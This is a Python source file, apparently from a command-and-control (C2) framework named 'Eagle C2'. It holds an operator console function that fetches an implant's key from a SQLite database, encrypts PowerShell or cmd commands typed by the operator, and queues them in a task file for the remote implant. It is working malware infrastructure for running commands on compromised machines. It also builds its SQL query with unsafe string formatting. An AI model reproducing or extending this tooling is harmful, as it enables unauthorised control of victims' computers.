import sqlite3
import C2Database, sqlite3, color
import encryption

C2 = C2Database.ConnectDatabase()

def Interact(conn, command):
    connect = sqlite3.connect("C2Database.db")
    name = command.split()[0]
    key = connect.execute("SELECT Key FROM Implants WHERE ImplantName='%s'" % name)
    results = key.fetchall()
    thekey = results[0][0]
    while True:

            interact_command = input("[%s%s%s]%s[%s%s%s]%s " % (color.red("Eagle"),color.yellow("@"),color.cyan("C2"),color.yellow("-->"),color.red("Implant"),color.yellow(":"),color.cyan(name),color.yellow("::>"))).strip()

            if interact_command[:10] == "powershell" or interact_command[:3] == "cmd":

                print ("[%s] Executing a %s command" % (color.cyan("*"),interact_command.split()[0]))

                enc_command = encryption.EncryptString(interact_command, thekey)
                print(enc_command)
                
                #print(encryption.decrypt(enc_command))

                save_command = open("data/implant/%s/Tasks.enc" % name, "w")
                save_command.write(enc_command)
                save_command.close()
            elif interact_command == "back":
                return True

    print(thekey)